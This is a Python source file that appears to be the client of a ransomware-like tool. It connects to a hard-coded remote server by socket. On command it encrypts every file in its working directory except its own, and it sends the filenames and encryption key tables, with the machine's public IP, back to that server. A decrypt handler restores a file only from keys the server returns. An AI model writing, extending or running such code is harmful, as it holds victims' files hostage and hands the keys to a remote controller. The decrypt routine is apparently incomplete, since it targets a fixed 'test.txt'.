
import os
import json
import requests
from pysocket import PySocketClient
from crypto import Crypto

ip = requests.get("http://ip.jsontest.com").json()["ip"]
host = "192.168.219.106" if ip == "125.182.224.34" else "125.182.224.34"
port = 8080

print(host)

ps = PySocketClient(host, port)
ct = Crypto()

def encrypt(server) :
    dir_path = "./"
    file_list = os.listdir(dir_path)
    table_list = []
    img_list = [
        "BMP", "RLE", "DIB", "JPEG", "JPG", "GIF", "PNG", "TIF", "TIFF", "JFIF",
        "bmp", "rle", "dib", "jpeg", "jpg", "gif", "png", "tif", "tiff", "jfif"
    ]

    for i in range(len(file_list)) :
        if "." in file_list[i] and not file_list[i] in ["client.exe", "decrypt.py", "client.py", "crypto.py"] :
            file_info = file_list[i].split(".")
            
            if file_info[1] in img_list :
                result, table = ct.encrypt_image_file(dir_path + "/" + file_list[i])

                table_list.append([file_list[i], table])

            else :
                result, table = ct.encrypt_file(dir_path + "/" + file_list[i])

                table_list.append([file_list[i], table])

        print(i)

    print("good")

    server.emit("data", json.dumps([{
        "ip" : ip,
        "file" : table_list[i][0],
        "table" : table_list[i][1]
    } for i in range(len(table_list))]))

def decrypt(server) :
    table = server.data[1:-1].split(",")

    for i in range(len(table)) :
        table[i] = int(table[i])

    result = ct.decrypt_file("test.txt", table)

ps.on("encrypt", encrypt)
ps.on("decrypt", decrypt)

ps.connect()